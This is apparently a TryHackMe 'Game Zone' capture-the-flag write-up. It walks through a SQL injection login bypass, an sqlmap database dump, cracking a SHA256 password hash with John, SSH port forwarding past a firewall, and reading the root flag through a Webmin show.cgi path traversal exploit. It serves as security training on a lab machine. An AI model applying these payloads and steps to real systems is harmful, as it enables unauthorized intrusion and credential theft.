# game Zone writeup
#pentest/tryhackme

Let’s try to login using our good old SQL Injection trick.

```
' OR 1=1 -- -
```

We are on `portal.php`, now what?

Since we know the site is vulnerable to SQL injection we might want to try to dump the database on our machine using `sqlmap`
Let’s go!

1. Search for something and capture that request using **burpsuite**.
2. Sabe the request as something like **request.txt** on our machine
3. Now let’s use `sqlmap`

```shell
$ sqlmap -r request.txt -dbms mysql --dump
...
[13:39:14] [INFO] table '`db`.users' dumped to CSV file '/home/kali/.sqlmap/output/10.10.244.212/dump/db/users.csv'
[13:39:14] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/10.10.244.212'
```

Let’s investigate. :) 

```shell
kali@kali:~/exercises/game_zone$ cat ~/.sqlmap/output/10.10.244.212/dump/db/users.csv 
pwd,username
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14,agent47
```

Let’s try to crack the password:

```shell
$ echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > hash.txt
$ sudo $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
...
videogamer124
...
```

Do you think they have ssh with `agent47` and password `videogamer124`? You bet!

```shell
$ ssh agent47@10.10.244.212
agent47@gamezone$ ls
user.txt
agent47@gamezone$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

## SSH Tunneling

**Situation:** Suppose you are at work and you want to access PORT 3389 to have remote access to your computer at home, but your work has a firewall blocking access to this port. What to do?

We can use SSH to forward the port 3389 to another port that is not blocked! This is called SSH tunneling. How can we do that?

`ssh -L <new-port>:<computer-you-want-to-foward-to>:<port-that-is-blocked> <username>@<computer-you-want-to-foward-to>`
so 
`ssh -L 8181:<your-home-ip>:3389 <username>@<computer-you-want-to-foward-to>`

## Going on
Let’s search around the machine for open sockets

```shell
ss -tulpn
...
# port 10000 exists but is blocked by a firewall
```

let’s use the ssh port forwarding that we just learned about!

```shell
ssh -L 10000:localhost:10000 agent47@<machine-ip>
```

Now we can go to out browser and visit `localhost:10000`
After logging in with the credentials we have we discover two things.

1. The framework is called **webmin**
2. The version is 

So we can try searching for a knoew vulnerability:

```shell
kali@kali:~$ searchsploit webmin -w
------------------------------------------------------------------------------------------
 Exploit Title                                                                |  URL
------------------------------------------------------------------------------------------ 
...                                                      
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)         | https://www.exploit-db.com/exploits/21851
...
```

Visiting https://www.exploit-db.com/exploits/21851 we learn that all we need to do to exploit this framework is to visit:
* localhost:10000/file/show.cgi/<any-file-path> as shown here https://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf

**So we just do it:**
localhost:10000/file/show.cgi/root/root.txt
a4b945830144bdd71908d12d902adeee
